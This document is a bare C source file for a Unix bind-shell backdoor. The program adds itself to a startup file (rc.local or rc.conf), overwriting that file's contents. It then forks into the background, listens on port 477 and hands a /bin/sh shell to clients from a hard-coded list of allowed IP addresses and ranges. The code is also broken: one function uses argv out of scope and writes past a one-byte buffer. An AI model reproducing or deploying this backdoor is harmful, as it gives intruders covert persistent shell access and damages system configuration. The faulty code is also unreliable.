#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>

#define MAXCON 31337

#define STARTUP 1

u_char* AllowedIP[] = { "192.169.1.43", "182.68.177.123", (void*)0 };
char* DynamicIP[] = { "62.129.*", (void*)0 };

int AuthCheck(u_char *ip)
{
    	int i;
    	for (i=0; AllowedIP[i] != NULL; i++)
        {
			if (!strcmp(ip, AllowedIP[i]))
			{
				return 1;
			}
        }
    	for (i=0; DynamicIP[i] != NULL; i++)
        {
			int x = (int)(strchr(DynamicIP[i], '*') - DynamicIP[i] - 1);

			char substring[] = "";
			strncat(substring, &argv[1][0], x+1);

			//printf("substring: %s, IPallowed: %s\n", substring, DynamicIP[i]);

			if (!strncmp(substring, DynamicIP[i], x+1))
			{
				printf("\nAccess granted!\n");
				return 1;
			}
    	}
    	return 0;
}

void domything(u_int sd, u_char *src) 
{
	if (AuthCheck(src))
	{
		dup2(sd, 0); //err
		dup2(sd, 1); //out
		dup2(sd, 2); //in
		execl("/bin/sh", "/bin/sh", (char *)0);
		close(sd); 
		exit(0);
    }
}

int main(int argc, char *argv[]) 
{
#ifdef STARTUP
	int on,i;
    char cwd[256],*str;
    FILE *file;
	str="/etc/rc.d/rc.local";
	file=fopen(str,"r");
    if (file == NULL) 
    {
        str="/etc/rc.conf";
        file=fopen(str,"r");
    }
    if (file == NULL) 
    {
        str="/etc/rc.local";
        file=fopen(str,"r");
    }
    if (file != NULL) 
    {
            char outfile[256], buf[1024];
            int i=strlen(argv[0]), d=0;
            getcwd(cwd,256);
            if (strcmp(cwd,"/")) 
            {
                    while(argv[0][i] != '/') i--;

                    sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                    while(!feof(file)) 
                    {
                            fgets(buf,1024,file);
                            if (!strcasecmp(buf,outfile)) d++;
                    }
                    if (d == 0) 
                    {
                            FILE *out;
                            fclose(file);
                            out=fopen(str,"w+");
                            if (out != NULL) 
                            {
                                    fputs(outfile,out);
                                    fputs("\nexit 0\n",out);
                                    fclose(out);
                            }
                    }
                    else fclose(file);
            }
            else fclose(file);
    }
#endif

    struct sockaddr_in local;
    struct sockaddr_in remote;
    int sIN, sOUT;
    int len;

    memset((u_char *)&local, 0, sizeof(local));

    local.sin_family = AF_INET;
    local.sin_addr.s_addr = INADDR_ANY;
    local.sin_port = htons(477);

    if ((sIN = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
    	perror("socket() failed");
    	return 1;
    }

    if (bind(sIN, (struct sockaddr *)&local, sizeof(local)))
	{
        perror("bind() failed");
    	return 1; 
    }

    if (listen(sIN, MAXCON)) 
	{
    	perror("listen() failed");
    	return 1; 
	}

    if (fork()) exit(0);

	len = sizeof(local);    

    while (1) 
	{
		sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
		if (fork() != 0)
		{
	    	close(sIN);
	    	domything(sOUT, inet_ntoa(remote.sin_addr));
		}
		close(sOUT);
    }
    close(sIN);
    return 0;
}
